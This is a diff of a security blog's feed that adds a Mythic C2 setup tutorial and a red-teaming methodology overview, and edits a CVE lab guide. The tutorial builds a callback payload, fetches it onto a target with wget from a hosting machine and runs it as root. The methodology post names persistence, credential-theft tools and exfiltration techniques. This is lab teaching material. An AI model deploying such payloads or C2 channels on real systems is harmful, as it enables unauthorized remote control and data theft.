+<p>Unlike some other C2 tools, Mythic does not ship with built‑in agents or listeners. Instead it lets users install and combine payload types (agents) and C2 profiles (communication methods) based on their needs, making it highly customizable and extensible.</p>
+<h2 id="installation">Installation</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<p>Mythic is designed to run on linux (It can be ran on macOS but it won&rsquo;t be covered by this series), it also use Docker and Docker Compose, it&rsquo;s also recommended to test things out on a VM.</p>
+<p>For this demonstration, I&rsquo;ll be using a Debian 13 terminal, Docker version 29.3.1, build c2be9cc.</p>
+<h3 id="installation--configuration">Installation &amp; Configuration</h3>
+<h4 id="mythic-installation">Mythic Installation</h4>
+<p>First, we need to pull the GitHub repository:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/its-a-feature/Mythic --depth <span style="color:#ae81ff">1</span> --single-branch
+</span></span></code></pre></div>
+    <img src="/mythic/install/git_pull.png"  alt="pulling mythic repo"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Next, we need to compile the <code>mythic-cli</code> binary. Most of the configuration and interaction with Mythic is done through this tool. Thankfully, the process is pretty straightforward.</p>
+<blockquote>
+<p>to help with GitHub sizes, the <code>mythic-cli</code> binary is no longer distributed with the main Mythic repository.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd Mythic/
+</span></span><span style="display:flex;"><span>sudo make
+</span></span></code></pre></div>
+    <img src="/mythic/install/make_cli.png"  alt="making the mythic CLI"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>And that’s it. Mythic is now installed on the machine. Next, we’ll move on to the initial configuration.</p>
+<h4 id="mythic-configuration">Mythic Configuration</h4>
+<p>Most of the Mythic configuration is handled through the <code>.env</code> file. This file is automatically created the first time you start the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ./mythic-cli start
+</span></span></code></pre></div>
+    <img src="/mythic/install/start.png"  alt="starting the mythic server"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Once the server is up and running, you can modify the master password inside the <code>.env</code> file by changing the <code>MYTHIC_ADMIN_PASSWORD</code> variable.</p>
+
+    <img src="/mythic/install/admin_pass.png"  alt="Changing the admin password inside the config file"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h4 id="installing-payloads-and-listeners">Installing Payloads and Listeners</h4>
+<p>As mentioned earlier, a fresh Mythic installation does not include any C2 profiles (listeners) or agents (payloads), so we need to install them manually. For this demonstration I&rsquo;ll be using the <strong><a href="https://github.com/MythicAgents/Medusa.git">Medusa</a></strong> agent linked with the <strong><a href="https://github.com/MythicC2Profiles/http">HTTP</a></strong> C2 Profile.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -E ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
+</span></span></code></pre></div>
+    <img src="/mythic/install/medusa.png"  alt="Installing Medusa"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -E ./mythic-cli install github https://github.com/MythicC2Profiles/http
+</span></span></code></pre></div>
+    <img src="/mythic/install/http.png"  alt="Installing http C2 profile"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>After installing both, restart Mythic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -E ./mythic-cli restart
+</span></span></code></pre></div>
+    <img src="/mythic/install/restart.png"  alt="restarting the mythic server"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h4 id="configuring-the-listener">Configuring the Listener</h4>
+<p>For this part, Now head over to the web interface: <a href="https://127.0.0.1:7443/">https://127.0.0.1:7443/</a> and supply the username and password that we configured on the <code>.env</code> file.</p>
+
+    <img src="/mythic/install/login.png"  alt="login into the c2 server"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>We’ll also change the default port for the HTTP listener to avoid conflicts.</p>
+<ul>
+<li>Click on the <a href="https://127.0.0.1:7443/new/payloadtypes">headphone icon</a></li>
+<li>Go to the C2 tab</li>
+<li>Select the HTTP profile</li>
+<li>Click View/Edit Config</li>
+<li>Change the port from 80 to 9001</li>
+</ul>
+
+    <img src="/mythic/install/port.png"  alt="changing port on http listener"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="crafting-our-first-payload">Crafting Our First Payload</h3>
+<p>Click on the <a href="https://127.0.0.1:7443/new/createpayload">+ icon</a> to create a new payload.</p>
+<p>For this example:</p>
+<ul>
+<li>Target platform: Linux</li>
+<li>Payload type: Medusa</li>
+</ul>
+
+    <img src="/mythic/install/payload.png"  alt="choosing the payload"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Select the commands you want to include. For now, we’ll include all of them.</p>
+
+    <img src="/mythic/install/commands.png"  alt="choosing commands"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Next:</p>
+<ul>
+<li>Disable encryption for simplicity (not recommended in real engagements)</li>
+<li>Set the callback IP address</li>
+<li>Set the callback port (must match the listener, e.g., 9001)</li>
+</ul>
+
+    <img src="/mythic/install/IP.png"  alt="Choosing ip address"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+
+    <img src="/mythic/install/port-2.png"  alt="choosing port"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Finally, give your payload a name and download it.</p>
+
+    <img src="/mythic/install/final.png"  alt="choosing port"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="infecting-the-target">Infecting the Target</h3>
+<p>For this demonstration, we’ll transfer the payload using a simple Python HTTP server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
+</span></span></code></pre></div>
+    <img src="/mythic/install/http.server.png"  alt="Opening a python http server"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>On the target machine :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.122.1:8000/test.py
+</span></span></code></pre></div>
+    <img src="/mythic/install/wget.png"  alt="Opening a python http server"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Then execute the payload (as root):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 test.py
+</span></span></code></pre></div><p>If everything is configured correctly, you should see a callback appear in the Mythic UI and be able to start issuing commands.</p>
+
+    <img src="/mythic/install/callback.png"  alt="callback window on mythic UI"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h2 id="common-issues">Common issues</h2>
+<p>One issue I ran into was seeing traffic on the callback port but no callbacks in the UI.</p>
+<p>This usually means:</p>
+<ul>
+<li>The C2 profile is not running properly</li>
+<li>The payload was misconfigured</li>
+<li>The callback port does not match the listener</li>
+</ul>
+<p>Firing up wireshark helped identify the issue.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>At this point, we have a fully working Mythic setup with a functioning C2 profile and a live callback. While the setup process might feel a bit involved at first, it highlights what makes Mythic powerful: its modularity and flexibility.</p>
+<p>In the next part, I’ll dive deeper into how agents actually work, how communication happens between the payload and the server, and how to start modifying or building your own components.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Red Teaming Methodology: A Complete Overview</title>
+            <link>/posts/red_teaming/</link>
+            <pubDate>Thu, 12 Mar 2026 00:55:01 +0000</pubDate>
+            
+            <guid>/posts/red_teaming/</guid>
+            <description>Red Teaming is a controlled simulation of adversarial attacks, designed to test and improve an organization&amp;rsquo;s security posture. By simulating the tactics, techniques, and procedures (TTPs) of real attackers, Red Team exercises help organizations evaluate their ability to detect, respond to, and recover from sophisticated threats.
+1. Introduction to Red Teaming The essence of Red Teaming is to think like an attacker: identify vulnerabilities, bypass defenses, and attempt unauthorized access to critical assets.</description>
+            <content type="html"><![CDATA[<p>Red Teaming is a controlled simulation of adversarial attacks, designed to test and improve an organization&rsquo;s security posture. By simulating the tactics, techniques, and procedures (TTPs) of real attackers, Red Team exercises help organizations evaluate their ability to detect, respond to, and recover from sophisticated threats.</p>
+<h2 id="1-introduction-to-red-teaming">1. Introduction to Red Teaming</h2>
+<p>The essence of Red Teaming is to <strong>think like an attacker</strong>: identify vulnerabilities, bypass defenses, and attempt unauthorized access to critical assets. This approach has evolved from simple network penetration testing to multi-layered exercises encompassing technical, physical, and social attack vectors.</p>
+<p>Unlike vulnerability scans or traditional penetration tests that aim to identify specific weaknesses, Red Teaming simulates the <strong>full attack lifecycle</strong>, from initial reconnaissance to data exfiltration. This gives organizations a realistic view of how well they can respond to actual attacks.</p>
+<h3 id="11-definition-and-evolution">1.1 Definition and Evolution</h3>
+<p>Modern Red Team exercises simulate complex multi-step attacks capable of challenging even mature security programs. This holistic approach provides insights into detection, response, and recovery capabilities, making Red Teaming an essential part of any robust cybersecurity strategy.</p>
+<h3 id="12-scope-and-objectives">1.2 Scope and Objectives</h3>
+<p>The scope of a Red Team engagement can vary widely: it may focus on a single application, a segment of the network, or the entire organization. Typical objectives include:</p>
+<ul>
+<li>Identifying vulnerabilities across technical, physical, and human layers.</li>
+<li>Providing actionable recommendations to improve security posture.</li>
+<li>Evaluating the organization’s detection and response capabilities.</li>
+<li>Identifying gaps in monitoring and incident management.</li>
+<li>Raising awareness among internal teams about attacker techniques and associated risks.</li>
+</ul>
+<hr>
+<h2 id="2-red-team-engagement-methodology">2. Red Team Engagement Methodology</h2>
+<p>A Red Team engagement follows a structured methodology that replicates the full attack cycle. The goal is to simulate an adversary’s behavior to evaluate the organization&rsquo;s defenses in a realistic, progressive manner.</p>
+<h3 id="21-planning-and-scoping">2.1 Planning and Scoping</h3>
+<p>Before launching technical activities, clear planning and scoping are critical. This phase defines objectives, boundaries, and resources.</p>
+<h4 id="211-objectives-and-success-criteria">2.1.1 Objectives and Success Criteria</h4>
+<p>Clear, measurable objectives might include:</p>
+<ul>
+<li>Gaining access to pre-defined critical assets.</li>
+<li>Measuring time to detection.</li>
+<li>Evaluating the effectiveness of incident response procedures.</li>
+</ul>
+<p>These criteria are used to measure the success of the engagement.</p>
+<h4 id="212-rules-of-engagement">2.1.2 Rules of Engagement</h4>
+<p>Rules of engagement define the operational boundaries:</p>
+<ul>
+<li>Systems, networks, and applications in scope.</li>
+<li>Authorized and prohibited techniques (e.g., social engineering, DoS attacks).</li>
+<li>Procedures for reporting critical vulnerabilities.</li>
+<li>Safety measures to avoid disrupting business operations.</li>
+</ul>
+<h4 id="213-resource-allocation-and-scheduling">2.1.3 Resource Allocation and Scheduling</h4>
+<p>This includes:</p>
+<ul>
+<li>Assigning personnel for each phase (reconnaissance, exploitation, reporting).</li>
+<li>Budgeting for tools, equipment, or external services.</li>
+<li>Scheduling the engagement phases and report delivery.</li>
+</ul>
+<h4 id="214-coordination-with-stakeholders">2.1.4 Coordination with Stakeholders</h4>
+<p>Engagements require alignment with IT teams, security teams, management, and legal advisors to ensure compliance and minimize operational risks.</p>
+<hr>
+<h3 id="22-preparation-and-passive-reconnaissance">2.2 Preparation and Passive Reconnaissance</h3>
+<p>Before active engagement, preparation includes collecting information to build an understanding of the target.</p>
+<h4 id="221-open-source-intelligence-osint">2.2.1 Open-Source Intelligence (OSINT)</h4>
+<p>OSINT involves collecting publicly available information, such as:</p>
+<ul>
+<li>Organizational structure</li>
+<li>Employee details</li>
+<li>Email formats</li>
+<li>Publicly exposed documents</li>
+<li>Technologies in use</li>
+<li>Previously leaked credentials</li>
+</ul>
+<p>Tools commonly used:</p>
+<ul>
+<li>theHarvester</li>
+<li>Maltego</li>
+<li>Google Dorking</li>
+<li>SpiderFoot</li>
+<li>Have I Been Pwned</li>
+</ul>
+<h4 id="222-passive-footprinting-and-digital-mapping">2.2.2 Passive Footprinting and Digital Mapping</h4>
+<p>Passive reconnaissance maps the external footprint without interacting with target systems:</p>
+<ul>
+<li>Identifying IP ranges, domains, and subdomains.</li>
+<li>Analyzing DNS records, SSL certificates, and historical data.</li>
+<li>Mapping exposed infrastructure.</li>
+</ul>
+<p>Tools commonly used:</p>
+<ul>
+<li>Amass</li>
+<li>Subfinder</li>
+<li>crt.sh</li>
+<li>Shodan</li>
+<li>DNSDumpster</li>
+</ul>
+<h4 id="223-documentation">2.2.3 Documentation</h4>
+<p>All collected intelligence is documented to guide attack scenarios and support comparison with active testing results.</p>
+<hr>
+<h3 id="23-initial-access">2.3 Initial Access</h3>
+<p>The Red Team uses collected information to gain a foothold in the target environment.</p>
+<h4 id="231-social-engineering--phishing">2.3.1 Social Engineering &amp; Phishing</h4>
+<p>Common techniques:</p>
+<ul>
+<li><strong>Spear phishing</strong>: targeted emails appearing legitimate.</li>
+<li><strong>Pretexting</strong>: creating a credible scenario to extract information.</li>
+<li><strong>Vishing &amp; SMiShing</strong>: phone or SMS-based manipulation.</li>
+</ul>
+<h4 id="232-exploitation-of-exposed-systems">2.3.2 Exploitation of Exposed Systems</h4>
+<p>Targeting internet-facing systems:</p>
+<ul>
+<li><strong>Web applications</strong>: SQL injection, XSS, misconfigurations.</li>
+<li><strong>Network services</strong>: open ports, outdated services, weak authentication.</li>
+</ul>
+<p>Tools commonly used:</p>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Vulnerability scanners</li>
+</ul>
+<p>Exploits may be publicly available or custom-developed for specific targets.</p>
+<hr>
+<h3 id="24-establishing-persistence">2.4 Establishing Persistence</h3>
+<p>Once access is obtained, the Red Team ensures a durable foothold.</p>
+<h4 id="241-persistence-mechanisms">2.4.1 Persistence Mechanisms</h4>
+<p>Methods include:</p>
+<ul>
+<li>Registry modifications (Run/RunOnce)</li>
+<li>Scheduled tasks</li>
+<li>Service installation/modification</li>
+<li>DLL hijacking</li>
+<li>WMI event subscriptions</li>
+<li>Logon/startup scripts</li>
+<li>Abuse of authentication or enterprise certificates</li>
+</ul>
+<h4 id="242-stealth-and-evasion">2.4.2 Stealth and Evasion</h4>
+<p>Techniques to avoid detection:</p>
+<ul>
+<li>Payload obfuscation</li>
+<li>Encrypted communication with command &amp; control</li>
+<li>Mimicking legitimate network traffic</li>
+</ul>
+<hr>
+<h3 id="25-internal-reconnaissance-lateral-movement-and-privilege-escalation">2.5 Internal Reconnaissance, Lateral Movement, and Privilege Escalation</h3>
+<p>After establishing a foothold, the Red Team maps internal resources and escalates privileges.</p>
+<h4 id="251-internal-reconnaissance">2.5.1 Internal Reconnaissance</h4>
+<ul>
+<li>Identify machines, services, shares, accounts, and groups.</li>
+<li>Map critical systems: domain controllers, file servers, databases, backup servers.</li>
+<li>Understand security tools in place to avoid detection.</li>
+</ul>
+<h4 id="252-lateral-movement--privilege-escalation">2.5.2 Lateral Movement &amp; Privilege Escalation</h4>
+<ul>
+<li>Move from compromised systems to other resources.</li>
+<li>Extract credentials, scan for vulnerable services, exploit trust relationships.</li>
+<li>Expand access toward high-value targets like admin accounts or sensitive databases.</li>
+</ul>
+<p>Tools commonly used:</p>
+<ul>
+<li>Mimikatz</li>
+<li>BloodHound</li>
+<li>CrackMapExec</li>
+</ul>
+<hr>
+<h3 id="26-achieving-engagement-objectives">2.6 Achieving Engagement Objectives</h3>
+<p>With extended access and elevated privileges, the Red Team focuses on demonstrating potential impact while staying <strong>within the scope of the engagement</strong>.</p>
+<p>Target assets may include:</p>
+<ul>
+<li>Internal documents and confidential files</li>
+<li>Databases and critical business information</li>
+<li>Source code repositories</li>
+<li>Sensitive accounts and credentials</li>
+<li>Mail servers and backup systems</li>
+</ul>
+<p>Exfiltration is simulated using secure methods:</p>
+<ul>
+<li>Encrypted channels (HTTPS, VPN)</li>
+<li>Existing protocols (DNS, HTTP)</li>
+<li>Splitting data into small chunks</li>
+<li>External cloud or simulated servers</li>
+</ul>
+<p>This shows how a real attacker could affect the organization, while respecting legal and contractual boundaries.</p>
+<h4 id="https-and-dns-exfiltration-conceptual">HTTPS and DNS Exfiltration (Conceptual)</h4>
+<ul>
+<li><strong>HTTPS</strong>: data is encoded and sent over normal HTTPS requests to an external server.</li>
+<li><strong>DNS</strong>: small fragments of data are embedded in subdomains of queries to an attacker-controlled domain.</li>
+<li>Both techniques blend into legitimate traffic to simulate stealthy exfiltration.</li>
+</ul>
+<hr>
+<h3 id="27-cleanup-engagement-closure-and-reporting">2.7 Cleanup, Engagement Closure, and Reporting</h3>
+<h4 id="271-cleanup-and-system-restoration">2.7.1 Cleanup and System Restoration</h4>
+<ul>
+<li>Remove all persistence mechanisms, payloads, and tools.</li>
+<li>Close communication channels.</li>
+<li>Restore modified configurations.</li>
+</ul>
+<h4 id="272-documentation-and-reporting">2.7.2 Documentation and Reporting</h4>
+<ul>
+<li>Detail attack vectors, accessed assets, and compromise timeline.</li>
+<li>Highlight detection and response gaps.</li>
+<li>Provide actionable recommendations for improving security.</li>
+</ul>
+<hr>
+<p>Red Teaming provides a realistic measure of an organization’s security posture, highlighting weaknesses and strengthening defenses through controlled, safe simulations.</p>
+<hr>
+<p>References:</p>
+<p>[1] <a href="https://securedebug.com/mastering-red-teaming-an-ultra-extensive-guide-to-processes-tools-and-techniques/">Mastering Red Teaming</a><br>
+[2] <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/open-source-intelligence-osint/">CrowdStrike OSINT Guide</a><br>
+[3] <a href="https://lorenzomeacci.com/advanced-initial-access-techniques">Advanced Initial Access Techniques</a><br>
+[4] <a href="https://pentestlab.blog/methodologies/red-teaming/persistence/">Red Team Persistence Techniques</a><br>
+[5] <a href="https://encyclopedia.kaspersky.com/glossary/lateral-movement/">Kaspersky Lateral Movement</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>CVE-2025-27591 Lab Setup and Exploitation Guide</title>
@@ -30,7 +1214,7 @@ By the end of this guide, you will have:</description>
 <hr>
 <h2 id="lab-setup">Lab Setup</h2>
 <h3 id="1-download-the-dockerfile">1. Download the Dockerfile</h3>
-<p>Download the lab Dockerfile (included at the bottom of this document). This Dockerfile builds a container with:</p>
+<p>Download the lab <a href="https://raw.githubusercontent.com/Yassine-elhammoumi/Yassine-elhammoumi.github.io/refs/heads/main/CVE_2025_27591/Dockerfile">Dockerfile</a> (included at the bottom of this document). This Dockerfile builds a container with:</p>
 <ul>
 <li>A vulnerable Apache server</li>
 <li>A CGI script with command injection</li>
@@ -113,7 +1297,7 @@ By the end of this guide, you will have:</description>
 <h3 id="step-5-transfer-the-exploit">Step 5: Transfer the Exploit</h3>
 <p>Start a Python HTTP server to host the exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div><p>Download the exploit inside the container:</p>
+</span></span></code></pre></div><p><a href="https://raw.githubusercontent.com/Yassine-elhammoumi/Yassine-elhammoumi.github.io/refs/heads/main/CVE_2025_27591/CVE_2025_27591.py">Download the exploit</a> inside the container:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://localhost:4444/CVE_2025_27591.py
 </span></span></code></pre></div>
     <img src="/CVE_2025_27591/wget.png"  alt="Fetching exploit"  class="center"  style="border-radius: 8px; width: 100%;"  />
